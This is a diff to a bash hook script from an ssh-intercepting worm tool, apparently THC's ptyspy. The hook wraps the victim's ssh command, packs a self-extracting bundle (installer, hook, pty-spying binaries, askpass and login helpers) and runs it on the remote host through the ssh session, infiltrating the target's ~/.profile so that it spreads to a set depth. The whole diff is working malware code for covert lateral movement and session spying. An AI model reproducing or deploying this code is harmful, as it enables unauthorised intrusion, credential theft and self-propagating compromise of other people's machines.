@@ -9,17 +9,8 @@
 # when the target's ~/.profile has been infiltrated - only then will the
 # ptyspy continue with the user's original ssh session to log in.
 
-DEBUGF()
-{
-	[[ -z $THC_IS_DEBUG ]] && return
-	echo >&2 "$@"
-}
-
-fsize()
-{
-	# Linux / OSX
-	echo $(stat -L -c%s "$1" 2>/dev/null || stat -L -f%z "$1" 2>/dev/null)
-}
+BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
+source "${BINDIR}/funcs" || exit 254
 
 mk_package()
 {
@@ -33,33 +24,33 @@ mk_package()
 
 	# Check if package.2gz needs to be generated again
 	local files
-	files="x.sh hook.sh ptyspy_bin.*"
+	files="x.sh hook.sh funcs thc_cli ssh_login.sh askpass.sh ptyspy_bin.*"
 	(cd "$THC_BASEDIR_LOCAL" 
 	if [[ -f "${THC_PACKAGE}" ]]; then
 		for f in $files; do
-			[[ "$f" -nt "${THC_PACKAGE}" ]] && { rm "${THC_PACKAGE}"; break; }
+			[[ "$f" -nt "${THC_PACKAGE}" ]] && { rm "${THC_PACKAGE}"; DEBUGF "Creating new package.2gz"; break; }
 		done
 	fi)
 
-	# [[ -n $THC_IS_DEBUG ]] && [[ -f "${THC_PACKAGE}" ]] && rm -f "${THC_PACKAGE}"
+	# [[ -n $THC_DEBUG ]] && [[ -f "${THC_PACKAGE}" ]] && rm -f "${THC_PACKAGE}"
 	# [[ -f "${THC_PACKAGE}" ]] && rm -f "${THC_PACKAGE}"
 	if [[ ! -f "${THC_PACKAGE}" ]]; then
 		DEBUGF "Creating ${THC_PACKAGE}..."
 		cat "${THC_BASEDIR_LOCAL}/x.sh" >>"${THC_PACKAGE}"
 		(cd "${THC_BASEDIR_LOCAL}" && \
-			tar cfh - $files) >>"${THC_PACKAGE}"
-			# OSX --uid=0 --gid=0
+			tar cfhz - $files) >>"${THC_PACKAGE}"
+			# OSX --uid=0 --gid=0 --no-mac-metadata
 			# Linux --owner=0 --group=0
 			# tar cfh - --owner=0 --group=0 $files) >>"${THC_PACKAGE}"
 	else
 		DEBUGF "Using existing ${THC_PACKAGE}..."
 	fi
-	# FSIZE_BIN=$(($(fsize "${THC_PACKAGE}") - $FSIZE))
-	# [[ -z $FSIZE_BIN ]] && exit 0
+	FSIZE_BIN=$(($(fsize "${THC_PACKAGE}") - $FSIZE))
+	[[ -z $FSIZE_BIN ]] && exit 0
 }
 
 # This hook is called whenever the real ssh is executed
-# echo THC_IS_DEBUG=${THC_IS_DEBUG}
+# echo THC_DEBUG=${THC_DEBUG}
 # echo THC_TARGET=$THC_TARGET
 # THC_SSH_PARAM contains the ssh arguments without argv[0] and without '[command]' (e.g. just the arguments to connect) 
 # echo THC_SSH_PARAM="${THC_SSH_PARAM}"
@@ -68,6 +59,14 @@ mk_package()
 # echo THC_BASEDIR_LOCAL=${THC_BASEDIR_LOCAL}
 # echo THC_PORT=${THC_PORT}
 
+# Check if we are looping (e.g. simplest type of looping: ssh to localhost)
+# source "${THC_BASEDIR_LOCAL}/seen_id" 2>/dev/null
+# if [[ -n $THC_SEEN_ID ]]; then
+# 	[[ -n $THC_SEEN_ID_LOCAL ]] && [[ $THC_SEEN_ID_LOCAL = $THC_SEEN_ID ]] && { echo >&2 "Looping (${THC_SEEN_ID}=${THC_SEEN_ID_LOCAL}"; exit 13; }
+# 	echo "THC_SEEN_ID_LOCAL=${THC_SEEN_ID}" >"${THC_BASEDIR_LOCAL}/seen_id"
+# fi
+# echo "LOOP ID=$THC_SEEN_ID ID_LOCAL=$THC_SEEN_ID_LOCAL"
+
 if [[ "$1" = "install" ]]; then
 	# Local install with "./hook.sh install"
 	[[ -z $THC_DEPTH ]] && THC_DEPTH=2 # default
@@ -75,9 +74,7 @@ if [[ "$1" = "install" ]]; then
 	THC_PACKAGE="${THC_BASEDIR_LOCAL}/package.2gz"
 	mk_package
 
-	cat "${THC_PACKAGE}" | THC_IS_DEBUG="${THC_IS_DEBUG}" THC_VERBOSE="${THC_VERBOSE}" THC_DEPTH="${THC_DEPTH}" THC_LOCAL=1 bash -c "$(dd ibs=1 count=${FSIZE} 2>/dev/null)" || exit 94
-	echo -e "--> Type \033[1;36mexec $SHELL\033[0m or re-login to start intercepting."
-    echo -e "--> Use \033[1;36mmake uninstall\033[0m to remove"
+	cat "${THC_PACKAGE}" | THC_FORCE_UPDATE=1 THC_TESTING="${THC_TESTING}" THC_DEBUG="${THC_DEBUG}" THC_VERBOSE="${THC_VERBOSE}" THC_DEPTH="${THC_DEPTH}" THC_LOCAL=1 bash -c "$(dd ibs=1 count=${FSIZE} 2>/dev/null)" || exit 94
 	exit
 fi
 
@@ -96,9 +93,7 @@ mk_package
 DEBUGF FSIZE=${FSIZE}
 # use -T for 'raw' terminal (no pty, no lastlog)
 # NOTE: Use 'exec' to have 1 less process showing up in ps list.
-exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && THC_IS_DEBUG=\"${THC_IS_DEBUG}\" THC_VERBOSE=\"${THC_VERBOSE}\" THC_DEPTH=\"${THC_DEPTH}\" bash -c \"\$(dd ibs=1 count=${FSIZE} 2>/dev/null)\" && echo THCFINISHED"
-# exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && THC_VERBOSE=\"${THC_VERBOSE}\" THC_DEPTH=\"${THC_DEPTH}\" FSIZE_BIN=\"${FSIZE_BIN}\" bash -c \"\$(dd ibs=1 count=${FSIZE})\" && echo THCFINISHED"
-# "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && echo THCPROFILE && sleep 1 && echo THCFINISHED"
+exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && FSIZE_BIN=\"${FSIZE_BIN}\" THC_TESTING=\"${THC_TESTING}\" THC_DEBUG=\"${THC_DEBUG}\" THC_VERBOSE=\"${THC_VERBOSE}\" THC_DEPTH=\"${THC_DEPTH}\" bash -c \"\$(dd ibs=1 count=${FSIZE} 2>/dev/null)\" && echo THCFINISHED"
 
 ### NOT REACHED if exec is used above ###
 ### NOT REACHED if exec is used above ###
